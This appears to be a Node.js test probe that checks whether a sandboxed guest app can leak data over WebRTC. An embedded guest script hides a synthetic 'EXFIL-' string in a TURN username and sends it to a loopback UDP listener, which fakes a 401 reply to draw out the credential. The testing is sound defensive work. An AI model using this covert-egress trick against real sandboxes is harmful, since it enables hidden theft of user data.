// KOTOBA-159 R6 manual browser probe: can a restricted guest send bytes out through WebRTC?
//   node test/browser/webrtc-egress-probe.mjs            serves the probe on 127.0.0.1 and prints its URL
//   RUNTIME_FILE=/path/to/other-runtime.js node ...      the same probe against another revision (negative control)
// Open the URL in a browser and wait six seconds. The page mounts a guest with the real
// mountRestrictedClientApp. The guest builds an RTCPeerConnection whose TURN username is a
// synthetic string; a local UDP listener records anything that reaches it. Synthetic data only,
// loopback only, no real service. Result in Chromium 156: without the neutralizer the string
// arrives (EGRESS DETECTED); with it nothing arrives.
import dgram from 'node:dgram';
import fs from 'node:fs';
import http from 'node:http';

const runtimeFile = process.env.RUNTIME_FILE ?? new URL('../../src/kotoba-client-runtime.js', import.meta.url).pathname;
const events = [];
const field = (type, value) => { const header = Buffer.alloc(4); header.writeUInt16BE(type, 0); header.writeUInt16BE(value.length, 2); return Buffer.concat([header, value, Buffer.alloc((4 - (value.length % 4)) % 4)]); };
const attributes = (message) => { const found = []; for (let at = 20; at + 4 <= message.length;) { const length = message.readUInt16BE(at + 2); found.push([message.readUInt16BE(at), message.subarray(at + 4, at + 4 + length)]); at += 4 + length + ((4 - (length % 4)) % 4); } return found; };
const udp = dgram.createSocket('udp4');
udp.on('message', (message, remote) => {
  const username = attributes(message).find(([type]) => type === 0x0006)?.[1]?.toString('utf8');
  events.push(`UDP packet from the guest: type 0x${message.readUInt16BE(0).toString(16).padStart(4, '0')}, ${message.length} bytes${username ? `, USERNAME=${JSON.stringify(username)}` : ''}`);
  if (message.readUInt16BE(0) === 0x0003 && !username) { // answer the first Allocate with 401 so the client retries with its username
    const body = Buffer.concat([field(0x0009, Buffer.from([0, 0, 4, 1, ...Buffer.from('Unauthorized')])), field(0x0014, Buffer.from('probe')), field(0x0015, Buffer.from('0123456789abcdef'))]);
    const head = Buffer.alloc(20); head.writeUInt16BE(0x0113, 0); head.writeUInt16BE(body.length, 2); message.copy(head, 4, 4, 20);
    udp.send(Buffer.concat([head, body]), remote.port, remote.address);
  }
});
await new Promise((resolve) => udp.bind(0, '127.0.0.1', resolve));
const udpPort = udp.address().port;
const server = http.createServer((request, response) => {
  const path = new URL(request.url, 'http://x').pathname;
  if (path === '/runtime.js') { response.setHeader('content-type', 'text/javascript'); return response.end(fs.readFileSync(runtimeFile)); }
  if (path === '/events') { response.setHeader('content-type', 'application/json'); return response.end(JSON.stringify(events)); }
  response.setHeader('content-type', 'text/html');
  response.end(`<!doctype html><meta charset=utf-8><title>webrtc egress probe</title><pre id=out>mounting the guest...</pre><div id=host></div><script type=module>
import { verifyClientArtifact, mountRestrictedClientApp } from '/runtime.js';
const secret = 'EXFIL-' + btoa('synthetic-user-data-42').slice(0, 24);
const guest = '<script>try{const pc=new RTCPeerConnection({iceServers:[{urls:"turn:127.0.0.1:${udpPort}?transport=udp",username:' + JSON.stringify(secret) + ',credential:"x"}],iceTransportPolicy:"relay"});pc.createDataChannel("x");pc.createOffer().then(o=>pc.setLocalDescription(o))}catch(e){}<\\/script>';
const bytes = new TextEncoder().encode(guest);
const digest = Array.from(new Uint8Array(await crypto.subtle.digest('SHA-256', bytes)), (b) => b.toString(16).padStart(2, '0')).join('');
const artifact = await verifyClientArtifact(bytes, { revision: '1'.repeat(40), sha256: digest, 'max-bytes': 65536 });
await mountRestrictedClientApp({ artifact, container: document.getElementById('host'), broker: { invoke() { throw new Error('unused'); } } });
setTimeout(async () => {
  const seen = await (await fetch('/events')).json();
  document.getElementById('out').textContent = (seen.length ? 'EGRESS DETECTED\\n' + seen.join('\\n') : 'no egress: the listener received nothing') + '\\nguest string: ' + secret;
}, 6000);
</script>`);
});
await new Promise((resolve) => server.listen(Number(process.env.PORT || 0), '127.0.0.1', resolve));
console.log(`http://127.0.0.1:${server.address().port}/  (runtime: ${runtimeFile}, UDP listener ${udpPort})`);
for (const signal of ['SIGINT', 'SIGTERM']) process.on(signal, () => process.exit(0));
